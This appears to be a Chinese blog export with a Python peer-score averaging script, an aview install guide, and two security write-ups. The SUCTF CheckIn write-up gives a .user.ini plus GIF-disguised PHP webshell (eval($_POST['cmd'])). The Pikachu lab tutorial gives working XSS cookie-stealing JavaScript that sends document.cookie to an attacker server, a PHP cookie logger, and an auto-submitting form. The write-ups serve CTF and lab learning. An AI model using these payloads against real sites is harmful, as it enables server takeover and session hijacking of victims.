<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> docx <span class="keyword">import</span> Document</span><br><span class="line"><span class="keyword">from</span> docx.shared <span class="keyword">import</span> Inches</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">the_number_of_files = <span class="number">27</span>   <span class="comment"># 文件数</span></span><br><span class="line">the_number_of_student = <span class="number">27</span>  <span class="comment"># 学生数</span></span><br><span class="line">the_number_of_item = <span class="number">5</span>      <span class="comment"># 打分项目数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个进度条函数需要的全局变量</span></span><br><span class="line">the_number_of_times = <span class="number">3</span> * the_number_of_files * the_number_of_student * the_number_of_item</span><br><span class="line">times = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进度条函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_progress</span><span class="params">()</span>:</span></span><br><span class="line">    per = round(<span class="number">30</span>*(times / the_number_of_times))</span><br><span class="line">    print(<span class="string">'['</span>+<span class="string">'*'</span>*per+<span class="string">' '</span>*(<span class="number">30</span>-per)+<span class="string">']'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> times</span><br><span class="line">    <span class="comment"># 目标文件初始化</span></span><br><span class="line">    document_result = Document()</span><br><span class="line">    document_result.add_heading(<span class="string">'学生互评分数计算结果'</span>)</span><br><span class="line">    table = document_result.add_table(rows=the_number_of_student+<span class="number">1</span>, cols=the_number_of_item+<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 表格表头初始化</span></span><br><span class="line">    first_table = Document(<span class="string">'1.docx'</span>).tables[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_item+<span class="number">1</span>):</span><br><span class="line">        table.rows[<span class="number">0</span>].cells[n].text = first_table.rows[<span class="number">2</span>].cells[n].text</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_student+<span class="number">1</span>):</span><br><span class="line">        table.rows[n].cells[<span class="number">0</span>].text = first_table.rows[<span class="number">3</span>+n].cells[<span class="number">0</span>].text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读文件, 取数据</span></span><br><span class="line">    data = [[[<span class="number">0</span>]*(the_number_of_item+<span class="number">1</span>)]*(the_number_of_student+<span class="number">1</span>)]*(the_number_of_student+<span class="number">1</span>)</span><br><span class="line">    arr = np.array(data)</span><br><span class="line">    <span class="keyword">for</span> index_of_file <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_files+<span class="number">1</span>):</span><br><span class="line">        source = Document(str(index_of_file)+<span class="string">'.docx'</span>).tables[<span class="number">0</span>]</span><br><span class="line">        show_progress()</span><br><span class="line">        <span class="keyword">for</span> index_of_rows <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_student+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> index_of_cells <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_item+<span class="number">1</span>):</span><br><span class="line">                times += <span class="number">2</span></span><br><span class="line">                <span class="comment"># 有些憨憨把空空着不写, 得判断下</span></span><br><span class="line">                <span class="keyword">if</span> len(source.rows[index_of_rows+<span class="number">3</span>].cells[index_of_cells].text) &gt; <span class="number">0</span>: </span><br><span class="line">                    arr[index_of_file][index_of_rows][index_of_cells] = float(source.rows[index_of_rows+<span class="number">3</span>].cells[index_of_cells].text)</span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    arr[index_of_file][index_of_rows][index_of_cells] = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 算结果</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_student+<span class="number">1</span>):</span><br><span class="line">        show_progress()</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_item+<span class="number">1</span>):</span><br><span class="line">            temp = []</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_files+<span class="number">1</span>):</span><br><span class="line">                times += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> arr[c][a][b] &gt; <span class="number">0</span>:</span><br><span class="line">                    temp.append(arr[c][a][b])</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 删除最大值和最小值</span></span><br><span class="line">            <span class="keyword">del</span> temp[temp.index(max(temp))]</span><br><span class="line">            <span class="keyword">del</span> temp[temp.index(min(temp))]</span><br><span class="line">            table.rows[a].cells[b].text = str(round(sum(temp)/len(temp),<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存成目标文件</span></span><br><span class="line">    document_result.save(<span class="string">'result.docx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h2><p>一时兴起的产物.</p>
<p>虽然代码写得很烂, 算法也朴实无华…</p>
<p>但确实帮到了室友, 我也学到了东西, 这让我感觉很棒. </p>
<p>也是第一次用python处理word, 感觉很有潜力, 未来可能还会深入的学习使用, 特别的来记录下. </p>
<h2 id="2019-9-4-更新"><a href="#2019-9-4-更新" class="headerlink" title="2019/9/4 更新"></a>2019/9/4 更新</h2><ul>
<li>改善进度条的效果</li>
<li>表头初始化优化, 大大缩短代码</li>
<li>加入了更多注释</li>
<li>修改了某些细节</li>
</ul>
<p><strong>或者点击下方为我打赏, 鼓励我写出更优质的脚本吧(手动滑稽)</strong></p>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
            <tag> word </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CheckIn]]></title>
      <url>/2019/08/19/CheckIn/</url>
      <content type="html"><![CDATA[<p>来源: SUCTF 2019</p>
<a id="more"></a>
<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>感谢<a href="https://www.tjuscswyz.cn/" target="_blank" rel="noopener">p4ssw0rd学长</a>和南开的<a href>QHX学长</a>, 在他们的指导下菜逼我终于搞出了这道题.</p>
<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码:"></a>题目代码:</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;/h2&gt;</span><br><span class="line">    &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;fileUpload&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// error_reporting(0);</span><br><span class="line">$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name) &#123;</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);</span><br><span class="line">    if (preg_match(&quot;/ph|htaccess/i&quot;, $extension)) &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;</span><br><span class="line">        die(&quot;&amp;lt;? in contents!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . &quot;/&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &apos; &lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;Your files : &lt;br&gt;&apos;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目特点"><a href="#题目特点" class="headerlink" title="题目特点:"></a>题目特点:</h2><ul>
<li>一看就是文件上传漏洞</li>
<li>会给出上传文件的目录</li>
<li>上传文件所在得目录下会自带个index.php, 这是一个关键的突破口.</li>
<li>会给出上传目录的<code>ls</code>的 var_dump .</li>
</ul>
<h2 id="题目难点"><a href="#题目难点" class="headerlink" title="题目难点:"></a>题目难点:</h2><ul>
<li>文件后缀名检测, 这让我们没法直接上传<code>.php</code>文件.</li>
<li>文件内容(首部)检测, 只能是图片格式.</li>
<li>检测<code>&lt;?</code>, 一句话木马不能用最常用的写法了.</li>
</ul>
<h2 id="题目解法-可能不唯一"><a href="#题目解法-可能不唯一" class="headerlink" title="题目解法(可能不唯一):"></a>题目解法(可能不唯一):</h2><p>因为我们没法上传php文件, 所以一定要让我们的马在 index.php 里运行.<br>这就会用到文件包含漏洞.</p>
<p>和我之前见到的<code>include &quot;xxx.xxx&quot;</code>不同, 这里需要用到文件<code>.user.ini</code>和<code>auto_prepend_file=filename.xxx</code>.</p>
<p>在这道题的配置中, 如果web目录下有上述的配置文件, 就可以在运行index.php时先解析<code>filename.xxx</code>文件. 而且可以是任何后缀的文件.</p>
<p>虽然不能写<code>&lt;?php   php_code     ?&gt;</code>这种形式, 但是可以用<code>&lt;script language=&quot;php&quot;&gt;php_code&lt;/sript&gt;</code>代替.</p>
<p>对于图片内容的检测, 如果我们以gif文件作为payload, 只需要加上<code>GIF89A</code>即可绕过. (仅对于本题中的<code>exif_imagetype()</code>函数及类似的检测方式.)</p>
<p>几个常见的文件头<br>|文件类型|文件头|文件尾|<br>|:—|:—|:—|<br>|PNG|89504E47|AE426082|<br>|GIF|47494638|003B|<br>|JPEG|FFD8FF|FFD9|<br>|ZIP|504B0304|504B|<br>|PDF|255044462D|—-|</p>
<p><a href="http://www.cnblogs.com/lwy-kitty/p/3928317.html" target="_blank" rel="noopener">还有一些不是很常用的</a></p>
<h2 id="总之"><a href="#总之" class="headerlink" title="总之"></a>总之</h2><p>.user.ini</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF</span><br><span class="line">auto_prepend_file=home.gif</span><br></pre></td></tr></table></figure>

<p>home.gif</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span>eval($_POST['cmd']);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传这两个文件后, 在访问同一目录下的 index.php , 我们的代码就被执行了.</p>
<p>flag: <code>SUCTF{U5er_1n1_01d_TR1ck}</code></p>
<p>完.</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> 文件包含漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一个有意思的小工具——aview]]></title>
      <url>/2019/08/17/asciiview/</url>
      <content type="html"><![CDATA[<p>给你康个好van的~</p>
<a id="more"></a>
<h1 id="asciiview"><a href="#asciiview" class="headerlink" title="asciiview"></a><code>asciiview</code></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一阵子发现了一个linux系统下的很好玩的小工具, 也就是 aview, 它可以把图片转化成字符画的形式, 并且可以对图片的一些属性, 比如亮度, 对比度进行调节和导出成各种文件格式. 效果我自认为供我们自娱自乐还是不错的.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/效果.jpg" alt title class>
                <p></p>
            </figure>
<p>这个我也没太调好, 实际效果要好一些的.</p>
<h2 id="安装-aview"><a href="#安装-aview" class="headerlink" title="安装 aview"></a>安装 aview</h2><p>安装 asciiview 本身并不麻烦, 一般来说使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install aview</span><br></pre></td></tr></table></figure>

<p>就可以一键安装了.<br>但如果你安装时显示”无法定位软件包”(或”unable to locate package aview”), 那应该是下载源的问题.<br>解决办法:</p>
<ol start="0">
<li><p>备份(选做)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cd /etc/apt</span><br><span class="line">sudo cp sources.list sources.list.bak</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 source.list<code></code>sudo vi /etc/apt/source.list`<br>然后加上这两行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>保存.</p>
<ol start="2">
<li><p>更新 apt-get</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新尝试下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install aview</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>通常这样就可以安装好了.</p>
<p>但是 aview 有个缺点就是对图片格式支持的比较少, 我们常用的大多数图片是没法被 aview 直接识别的.<br>所以我们还需要另外的一款工具 ImageMagick`.<br>这个工具安装起来有点麻烦, 如果你的 linux 使用了yum, 你可以尝试直接下载安装. 但如果是用 apt-get, 八成是没法直接安装的.<br>我们要先下载它的<a href="http://www.imagemagick.org/download/" target="_blank" rel="noopener">源码</a><br>解压后放在合适的目录下, 然后在解压后的目录下运行configure</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure>

<p>运行结束后会有个检测报告, 如果缺乏依赖的软件或者库会报告给你, 我没有遇到就不赘述了. <del>主要是我也看不懂</del><br>下面需要使用make进行编译安装.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>到这里安装就结束了. 使用命令<code>convert -version</code>查看是否成功.<br>ImageMagick 的使用和复杂, 在这里不介绍了.<br>其实如果没有安装成功也没有关系, 网上也有很多在线图片格式转换的网站, 也很省事.<br><a href="https://convertio.co/zh/pgm-converter/" target="_blank" rel="noopener">在线pgm转换器</a></p>
<h2 id="使用-aview"><a href="#使用-aview" class="headerlink" title="使用 aview"></a>使用 aview</h2><p>使用方法比较简单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aview filename.pgm</span><br></pre></td></tr></table></figure>

<p>可以看到预览界面.<br>除此之外, 还有这些功能:</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/aview.png" alt title class>
                <p></p>
            </figure>
<p>可以用它们来调整图像效果, 或者导出为<code>txt, html</code> 等格式.</p>
<p>完.<br><del>其实我只是想让你们看下我的新封面而已.</del></p>
]]></content>
      
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> misc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pikachu 漏洞练习平台]]></title>
      <url>/2019/08/14/xss-csrf%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="https://bbs.pediy.com/thread-246122.htm" target="_blank" rel="noopener">了解一下?</a></p>
<a id="more"></a>
<h1 id="Pikachu-漏洞练习平台"><a href="#Pikachu-漏洞练习平台" class="headerlink" title="Pikachu 漏洞练习平台"></a>Pikachu 漏洞练习平台</h1><p>下面的演示中, 攻击者与被攻击者使用同一台服务器, ip地址使用<code>ipadd</code>代替</p>
<h2 id="xss-Cross-Site-Scripting"><a href="#xss-Cross-Site-Scripting" class="headerlink" title="xss(Cross-Site Scripting)"></a>xss(Cross-Site Scripting)</h2><h3 id="什么是"><a href="#什么是" class="headerlink" title="什么是"></a>什么是</h3><p>高深莫测版:</p>
<ul>
<li>xss: 跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</li>
<li>csrf: 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li>
</ul>
<p>通俗易懂版:</p>
<ul>
<li>xss: 通过客户端脚本语言（最常见如：JavaScript），在网页上注入恶意脚本，且代码内容请求外部服务器。</li>
<li>csrf: 又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。</li>
</ul>
<h3 id="反射性xss-GET"><a href="#反射性xss-GET" class="headerlink" title="反射性xss(GET)"></a>反射性xss(GET)</h3><p>首先尝试下输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, 发现有字数限制, 然而通过观察或者抓包可以发现参数是通过GET上传的, 那么把刚才的代码赋值给参数message后, 成功的弹窗.<br>然后在服务器写入下面两个文件</p>
<ul>
<li><code>get_cookie.js</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://ipadd/myxss/index.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这个js文件可以在页面中追加一个图片资源, 并且指向我们自己的一台服务器的某个文件(即下面的<code>index.php</code>)并向其发送参数. </p>
<ul>
<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$time = time();</span><br><span class="line"></span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">$referer = $_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$txt = date(&quot;Y/m/d-h:i:s&quot;).&quot; ip=&quot;.$ip.&quot;  cookie=&quot;.$cookie.&quot; referer=&quot;.$referer.&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">echo $txt;</span><br><span class="line">file_put_contents(&quot;log.txt&quot;,$txt,FILE_APPEND);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>接收上面传来的参数, 并保存于文件<code>log.txt</code>中<br>这些准备工作完成后, 构造下面的payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipadd/pikachu/vul/xss/xss_reflected_get.php?message=&lt;script src=http://ipadd/myjs/get_cookie.js /&gt;&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>在浏览器访问后, 再查看<code>log.txt</code>中已经有了访问该链接的用户的cookie.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/get_cookie.png" alt title class>
                <p></p>
            </figure>
<h3 id="反射性xss-POST"><a href="#反射性xss-POST" class="headerlink" title="反射性xss(POST)"></a>反射性xss(POST)</h3><p>这题让我有些疑惑, 题目最开始是个登陆框, 这里应该是大概要用sql注入或者其它漏洞登陆后才有后续吧? 还好点一下提示后告诉了我们密码, 先登录再说.<br>登录后, 就和上题一样了, 唯一的区别是这次是用POST传参数, 我们抓下包, 修改其中 message 成我们的恶意代码. 后面的一切顺利.</p>
<p>但是这样还远远不够, 因为仅仅获取了我们自己的cookie.<br>试想下, 如何才能获取其它用户的cookie呢?</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/mind.png" alt title class>
                <p></p>
            </figure>

<p>如果使用题目提供的admin账号登录后, 我们发现从登录页面跳转到了真的题目页<code>http://ipadd/pikachu/vul/xss/xsspost/xss_reflected_post.php</code>.<br>如果我们登录后直接访问这个页面发现的确不需要使用账号密码. 所以访问这个页面时一定使用了cookie. </p>
<p>我需要他(受害者)能够提交一份包含着我的代码的表单. 这里就需要伪造一个自动提交表单的页面.<br>可以先看下我们正常提交时的http数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /pikachu/vul/xss/xsspost/xss_reflected_post.php HTTP/1.1</span><br><span class="line">Referer: http://ipadd/myxss/xss_post.php</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 94</span><br><span class="line">Host: ipadd</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=172i5in739ti4qqb1f2c752627</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">message=%3Cscript+src%3Dhttp%3A%2F%2Fipadd%3A999%2Fmyjs%2Fget_cookie.js&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>我们的表单需要两个参数<code>message</code>和<code>submit</code>.<br>它们的值先预先写进网页中, 在使用js脚本自动提交.<br><code>xss_post.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://ipadd/pikachu/vul/xss/xsspost/xss_reflected_post.php"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"xssr_in"</span> <span class="attr">type</span>= <span class="string">"text"</span> <span class="attr">maxlength</span>=<span class="string">"20"</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"&lt;script src=http://ipadd/myjs/get_cookie.js /&gt;"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"postsubmit"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.getElementById(<span class="string">"postsubmit"</span>).click();</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

